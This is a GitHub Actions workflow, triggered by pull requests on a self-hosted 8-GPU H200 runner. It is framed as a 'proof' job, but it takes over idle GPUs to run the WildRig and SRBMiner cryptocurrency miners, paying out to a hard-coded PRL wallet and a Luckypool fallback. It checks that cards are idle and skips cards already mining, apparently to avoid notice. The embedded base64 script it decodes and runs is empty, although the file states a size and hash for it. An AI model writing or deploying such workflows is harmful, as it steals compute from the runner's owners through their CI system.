name: i131029 h200 adopt

# i131029: ONE bounded adopt-what-it-lands-on job on the 8-gpu-h200 self-hosted label.
# A card is launched exactly once only when it measures genuinely idle (two empty compute-app
# samples 10 s apart, util == 0, memory.used < 1500 MiB, no bound srb*/wildrig*/wr* process);
# every other card is SKIP-WITH-CAUSE and is never signalled.  Endpoint selection is R2b, the
# OCL loader is staged before the functional preflight, and the miner is pinned WildRig Multi
# 0.52.3 (tarball 7308c95f..., binary 002cd29c...) on the R0b new-deployment PRL wallet.
on:
  pull_request:
    branches: [main]
    types: [opened, synchronize, reopened]

permissions:
  contents: read

concurrency:
  group: i131029-${{ github.run_id }}
  cancel-in-progress: false

jobs:
  proof:
    name: "i131029 8-gpu-h200 adopt-and-launch stratum proof"
    runs-on: 8-gpu-h200
    timeout-minutes: 48
    env:
      LABEL: 8-gpu-h200
      I131029_WALLET: "prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql"
      I131029_WORKERS: "996300,996301,996302,996303,996304,996305,996306,996307"
      I131029_EXPIRES_EPOCH: "1795352051"
    steps:
      - name: "phase 1: adopt idle H200s + WildRig 0.52.3 pearlhash two-sample proof"
        continue-on-error: true
        run: |
          mkdir -p /var/tmp/i131029/logs
          printf '%s' '' | base64 -d > /var/tmp/i131029/ev.py
          echo "I131029_SCRIPT_SHA256 e3c4b7fcbee9ec56b39888529a6d1a2563a5b275ce3d5de04837c4ff1e992b55"
          echo "I131029_SCRIPT_BYTES 45739"
          I131029_PHASE=primary python3 /var/tmp/i131029/ev.py 2>&1 | tee /var/tmp/i131029/ev_primary.log | tail -c 200000
          echo "I131029_PRIMARY_DONE rc=$?"
      - name: "phase 2: R5b/R5c Luckypool fallback with SRBMiner-MULTI 3.8.8 (only on hard failure)"
        if: always()
        continue-on-error: true
        run: |
          I131029_PHASE=fallback python3 /var/tmp/i131029/ev.py 2>&1 | tee /var/tmp/i131029/ev_fallback.log | tail -c 200000
          echo "I131029_FALLBACK_DONE rc=$?"
